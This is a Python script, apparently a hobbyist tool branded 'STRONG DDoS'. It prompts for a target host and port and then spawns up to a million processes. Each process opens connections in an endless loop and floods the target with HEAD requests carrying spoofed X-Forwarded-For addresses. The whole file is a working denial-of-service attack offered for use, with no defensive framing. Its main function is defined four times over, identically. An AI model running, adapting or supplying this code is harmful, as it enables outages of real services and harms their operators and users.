import socket
import os
from time import sleep
import multiprocessing
import random
import platform

print("\033[91mDetecting System...\033[0m")
print(" ")
sysOS = platform.system()
print("System Detected : ",sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 1030000")
  except Exception as e:
    print(e)
    print("\033[93mCould Not Start The Script\033[0m")
else:
  print("\033[94mYour System is Not Linux, You May Not Be Able To Run This Script in Some Systems\033[0m")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass
print(" ")
print("\033[96mWelcome To STRONG DDoS\033[0m")
print(" ")
print("\033[91m  ,---. ,--------.,------.  ,-----. ,--.  ,--. ,----.    \033[0m")
print("\033[92m '   .-''--.  .--'|  .--. ''  .-.  '|  ,'.|  |'  .-./    \033[0m")
print("\033[93m `.  `-.   |  |   |  '--'.'|  | |  ||  |' '  ||  | .---. \033[0m")
print("\033[94m .-'    |  |  |   |  |\  \ '  '-'  '|  | `   |'  '--'  | \033[0m")
print("\033[95m `-----'   `--'   `--' '--' `-----' `--'  `--' `------'  \033[0m")
print(" ")
ip = input("IP/Domain : ")
port = int(input("Port : "))
url = f"http://{str(ip)}"
print(" ")
print("\033[92mStarting The Attack\033[0m")
print(" ")
sleep(1)

def send2attack():
  for i in range(1000000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts
    
def send2attack():
  for i in range(1000000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts
    
def send2attack():
  for i in range(1000000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts
    
def send2attack():
  for i in range(1000000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack()
